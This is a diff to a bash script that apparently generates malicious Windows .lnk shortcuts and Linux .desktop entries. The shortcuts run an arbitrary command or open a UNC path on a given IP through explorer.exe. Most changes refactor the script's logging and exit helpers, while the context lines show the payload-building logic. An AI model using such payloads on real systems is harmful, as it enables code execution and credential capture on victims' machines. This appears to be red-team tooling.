@@ -1,12 +1,11 @@
 #!/usr/bin/env bash
 
-: <<-'COMMENT'
-Immediately enable "strict mode" so that:
-    - any unbound variable causes an error (-u)
-    - any failed command causes an exit (-e)
-    - any failure in a pipeline causes the pipeline to fail (-o pipefail)
-COMMENT
 set -euo pipefail
+
+BLUE="\033[1;34m"
+GREEN="\033[1;32m"
+RED="\033[1;31m"
+RESET="\033[0m"
 
 # Set the WINEPREFIX_DIRECTORY to the user's home directory
 WINEPREFIX_DIRECTORY="${HOME}/.wine"
@@ -26,27 +25,42 @@ WORKINGDIRECTORY=""
 OUTPUT=""
 PAYLOAD=""
 
+function check_program() {
+    type -P "${1}" 2>/dev/null
+}
+
 function print() {
-    local status="${1}"
-    local message="${2}"
-    local color
+    local text="${1}"
 
-    case "${status}" in
-        information) color="\033[1;34m[*]\033[0m" ;;    # Bold Blue
-        completed) color="\033[1;32m[+]\033[0m" ;;      # Bold Green
-        error) color="\033[1;31m[-]\033[0m" ;;          # Bold Red
-    esac
+    echo -e "${text}"
+}
 
-    echo -e "${color} ${message}"
+function info() {
+    local message="${1}"
+    local color="${BLUE}[*]${RESET}"
+
+    print "${color} ${message}"
+}
+
+function finish() {
+    local message="${1}"
+    local color="${GREEN}[*]${RESET}"
+
+    print "${color} ${message}"
+}
+
+function error() {
+    local message="${1}"
+    local color="${RED}[*]${RESET}"
+
+    print "${color} ${message}"
 }
 
 function quit() {
-    print "information" "Terminating program..."
-    exit "${1}"
-}
+    local code="${1}"
 
-function check_program() {
-    type -P "${1}" 2>/dev/null
+    ((code != 0)) && info "Terminating program..."
+    exit "${1}"
 }
 
 function check_dependencies() {
@@ -56,7 +70,7 @@ function check_dependencies() {
 
     if [[ ! -d "${WINEPREFIX_DIRECTORY}" ]]
     then
-        print "error" "Directory not found: ${WINEPREFIX_DIRECTORY}. WINEPREFIX directory has not been initialized!"
+        error "Directory not found: ${WINEPREFIX_DIRECTORY}. WINEPREFIX directory has not been initialized!"
         quit 1
     fi
 
@@ -82,7 +96,7 @@ function check_dependencies() {
 
     if ((${#missing[@]} > 0))
     then
-        print "error" "Required dependencies: ${missing[*]}"
+        error "Required dependencies: ${missing[*]}"
         quit 1
     fi
 }
@@ -134,11 +148,11 @@ function generate() {
                 script+="\$Shortcut.Arguments = '${arguments}'\n"
             elif (("${#arguments}" >= 260))
             then
-                print "error" "Arguments must not exceed more than 260 characters"
+                error "Arguments must not exceed more than 260 characters"
                 quit 1
             elif [[ -z "${arguments}" ]]
             then
-                print "error" "Command and arguments must be passed!"
+                error "Command and arguments must be passed!"
                 quit 1
             fi
         elif [[ -n "${IP}" ]] # check if IP is passed if command is not passed
@@ -183,7 +197,7 @@ function generate() {
             script+="\$Shortcut.TargetPath = 'C:\\Windows\\\\explorer.exe'\n"
             script+="\$Shortcut.Arguments = '/root,\"\\${unc}\"'\n"
         else
-            print "error" "You must provide either -c (command) or -i (IP) for 'lnk' payload."
+            error "You must provide either -c (command) or -i (IP) for 'lnk' payload."
             quit 1
         fi
 
@@ -205,7 +219,7 @@ function generate() {
         then
             if [[ -z "${windowstyle[${WINDOW}]+_}" ]]
             then
-                print "error" "Invalid window style: ${WINDOW}"
+                error "Invalid window style: ${WINDOW}"
                 quit 1
             fi
             script+="\$Shortcut.WindowStyle = ${windowstyle[${WINDOW}]}\n"
@@ -239,7 +253,7 @@ function generate() {
             execute+=("--set-key='Version'")
             execute+=("--set-value='1.0'")
         else
-            print "error" "Name must be passed!"
+            error "Name must be passed!"
             quit 1
         fi
 
@@ -247,7 +261,7 @@ function generate() {
         then
             if (("${#arguments}" <= 2090326))
             then
-                print "error" "Arguments must not exceed more than 2090326 characters"
+                error "Arguments must not exceed more than 2090326 characters"
                 quit 1
             fi
             execute+=("--set-key='Exec'")
@@ -257,7 +271,7 @@ function generate() {
             execute+=("--set-key='Exec'")
             execute+=("--set-value='${command}'")
         else
-            print "error" "At least command and/or arguments must be passed!"
+            error "At least command and/or arguments must be passed!"
             quit 1
         fi
 
@@ -288,7 +302,7 @@ function generate() {
                 execute+=("--set-key=\"Terminal\"")
                 execute+=("--set-value=\"${WINDOW}\"")
             else
-                print "error" "The Terminal must be set either 'true' or 'false'!"
+                error "The Terminal must be set either 'true' or 'false'!"
             fi
         fi
         execute+=("--set-key=\"Type\"")
@@ -319,7 +333,7 @@ function generate() {
             desktop_entry
             ;;
         *)
-            print "error" "Available payloads are: 'lnk' and 'desktop'!"
+            error "Available payloads are: 'lnk' and 'desktop'!"
             quit 1
             ;;
         esac
@@ -353,7 +367,7 @@ Flags:
     -v, --version                       Display the program's version number.
     -h, --help                          Display the help menu."
 
-    exit 0
+    quit 0
 }
 
 function main() {
@@ -365,7 +379,7 @@ function main() {
 
     if ((${?} != 0))
     then
-        print "error" "Failed to parse options... Exiting." >&2
+        error "Failed to parse options... Exiting." >&2
         quit 1
     fi
 
@@ -434,7 +448,7 @@ function main() {
                 break
                 ;;
             *)
-                print "error" "Invalid option: ${1}" >&2
+                error "Invalid option: ${1}" >&2
                 quit 1
                 ;;
         esac
@@ -450,11 +464,11 @@ function main() {
     then
         if [[ -n "${COMMAND}" && -n "${IP}" ]]
         then
-            print "error" "Cannot use both -c (command) and -i (IP) together for 'lnk' payload. Choose one."
+            error "Cannot use both -c (command) and -i (IP) together for 'lnk' payload. Choose one."
             quit 1
         elif [[ -z "${COMMAND}" && -z "${IP}" ]]
         then
-            print "error" "You must provide either -c (command) or -i (IP) for 'lnk' payload."
+            error "You must provide either -c (command) or -i (IP) for 'lnk' payload."
             quit 1
         fi
     fi
@@ -468,13 +482,13 @@ function main() {
             generate "${PAYLOAD}"
         elif [[ ! -d "${directory}" ]]
         then
-            print "error" "Directory path does not exist: ${directory}"
+            error "Directory path does not exist: ${directory}"
         elif [[ -d "${directory}" && ! -w "${directory}" ]]
         then
-            print "error" "Permission denied: Cannot generate payload to directory path: ${directory}."
+            error "Permission denied: Cannot generate payload to directory path: ${directory}."
         fi
     else
-        print "error" "Output file must be specified!"
+        error "Output file must be specified!"
         quit 1
     fi
 }
